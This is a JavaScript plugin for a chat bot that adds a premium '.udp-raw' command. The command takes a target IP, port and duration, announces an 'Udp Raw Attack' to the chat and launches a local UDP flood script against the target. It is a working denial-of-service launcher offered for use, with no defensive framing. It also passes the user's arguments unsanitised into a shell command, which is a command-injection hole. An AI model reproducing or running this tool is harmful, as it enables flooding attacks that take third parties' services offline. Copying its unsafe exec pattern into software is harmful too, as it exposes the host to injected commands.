const { exec } = require('child_process')

const handler = async (m, { args }) => {
    if (args.length < 3) {
        m.reply(`\`\`\`[🔍] .udp-raw [ip] [port] [duration]\`\`\``)
        return;
    }

    const hostname = args[0];
    const port = args[1];
    const duration = args[2];

conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title:  global.title,
body: `This Action Will Make A Deadly Move`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: global.attacking,
sourceUrl: ``
}}, text: `\`Udp Raw Attack\`
\`Host:\` ${hostname}
\`Port:\` ${port}
\`User:\` ${m.sender}
\`Duration:\` ${duration} Seconds
\`Creator:\` Demon`}, {quoted: m})
    exec(`node ./lib/SkyranXMODS/RanXUdp.js ${hostname} ${port} ${duration}`);
}

handler.help = ['udp-raw']
handler.tags = ['tools', 'attack'];
handler.premium = true
handler.command = /^(udp-raw)$/i;
module.exports = handler
